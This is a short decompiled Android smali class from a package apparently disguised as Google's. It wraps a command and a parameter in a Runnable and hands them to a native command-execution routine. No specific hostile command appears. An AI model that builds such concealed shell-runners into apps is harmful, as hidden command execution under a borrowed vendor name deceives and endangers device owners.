.class Lcom/google/ssearch/Utils$1;
.super Ljava/lang/Object;
.source "Utils.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/google/ssearch/Utils;->runsh(Ljava/lang/String;Ljava/lang/String;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field private final synthetic val$cmd:Ljava/lang/String;

.field private final synthetic val$param:Ljava/lang/String;


# direct methods
.method constructor <init>(Ljava/lang/String;Ljava/lang/String;)V
    .locals 0

    .prologue
    .line 1
    iput-object p1, p0, Lcom/google/ssearch/Utils$1;->val$cmd:Ljava/lang/String;

    iput-object p2, p0, Lcom/google/ssearch/Utils$1;->val$param:Ljava/lang/String;

    .line 106
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 2

    .prologue
    .line 108
    iget-object v0, p0, Lcom/google/ssearch/Utils$1;->val$cmd:Ljava/lang/String;

    iget-object v1, p0, Lcom/google/ssearch/Utils$1;->val$param:Ljava/lang/String;

    invoke-static {v0, v1}, Luk/co/lilhermit/android/core/Native;->runcmd_wrapper(Ljava/lang/String;Ljava/lang/String;)I

    .line 109
    return-void
.end method
